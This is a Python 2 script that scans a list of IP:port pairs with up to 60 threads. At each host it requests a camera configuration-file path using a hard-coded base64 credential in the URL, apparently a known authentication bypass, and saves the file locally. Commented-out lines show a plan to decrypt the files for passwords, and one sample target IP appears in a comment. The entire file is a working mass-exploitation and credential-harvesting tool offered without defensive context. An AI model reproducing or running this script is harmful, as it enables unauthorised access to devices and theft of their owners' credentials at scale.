import urllib
import urllib2
import requests
import threading
import exceptions
import time

#from get_passwd import decrypt_byfilename

requestRate = 1
g_max_thread = 60
_ip_list = []


def download_file(reqSession, __f_url, __url, __port):
    _file_name = __url + '_' + str(__port) + '.' + 'con'
    #_file_plan_name = __url + '_' + str(__port) + '.' + 'plantext'
    requestCounter = 0
    _success_url = ''

    while requestCounter < requestRate:
        try:
            response1 = reqSession.get(__f_url, timeout=15)
            if 200 == response1.status_code:
                #_success_url = __url + ':' + str(__port) + '\n'
                _h_f = open(_file_name, 'wb')
                _h_f.write(response1.content)
                _h_f.close()
                #open(_file_name, 'wb').write(response1.content)
                #decrypt_byfilename(_file_name, _file_plan_name)
        except Exception, e:
            _fail_url = __url + ':' + str(__port) + '\n'
            print _fail_url
        requestCounter += 1


def wait_thread():
    for th in threading.enumerate():
        if th != threading.current_thread():
            th.join()


def main():

    _ip_list = []
    g_host_file_path = 'success.txt'
    with open(g_host_file_path, 'r') as f_h:
        for line in f_h.readlines():
            _ip_list.append(line)

   # _ip_list = ['218.73.151.187:84']

    i = 0
    total = 0
    t_count = len(_ip_list)

    for _l in _ip_list:
        _l = _l.replace('\n', '')
        _url_list = _l.split(':')
        _url = _url_list[0]
        _port = _url_list[1]

        _url_tail = '/System/configurationFile?auth=YWRtaW46MTEK'
        _full_img_url = 'http://' + _url + ':' + str(_port) + _url_tail

        __s1 = requests.session()
        __th = threading.Thread(
            target=download_file, args=(__s1, _full_img_url, _url, _port))
        __th.start()
        i += 1
        if i > g_max_thread:
            total = total + i
            i = 0
            print 'threading.active_count():' + str(threading.active_count())
            wait_thread()
            print '[' + str(total) + '/' + str(t_count) + ']'

    print('all done ')

if __name__ == '__main__':
    main()
